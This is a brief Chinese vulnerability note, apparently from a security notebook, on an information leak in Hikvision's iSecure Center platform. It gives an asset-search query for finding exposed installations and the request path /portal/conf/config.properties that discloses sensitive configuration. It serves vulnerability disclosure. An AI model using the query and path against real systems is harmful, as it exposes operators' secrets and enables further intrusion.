# 海康威视iSecure Center综合安防管理平台 config.properties信息泄漏漏洞

# 一、漏洞简介
HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取等敏感信息进一步攻击。

# 二、影响版本
+ HIKVISION 综合安防管理平台

# 三、<font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`

![1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5.png](./img/Cfz58EmYVbCTQdd3/1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5-961023.png)

+ 登录页面

![1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f.png](./img/Cfz58EmYVbCTQdd3/1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f-085091.png)

# 四、漏洞复现
```plain
/portal/conf/config.properties
```

![1698592701679-7048f5ce-cf66-4e17-927a-006bcaf9ea9c.png](./img/Cfz58EmYVbCTQdd3/1698592701679-7048f5ce-cf66-4e17-927a-006bcaf9ea9c-458685.png)



> 更新: 2024-02-29 23:57:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uwdr74gfask18f9t>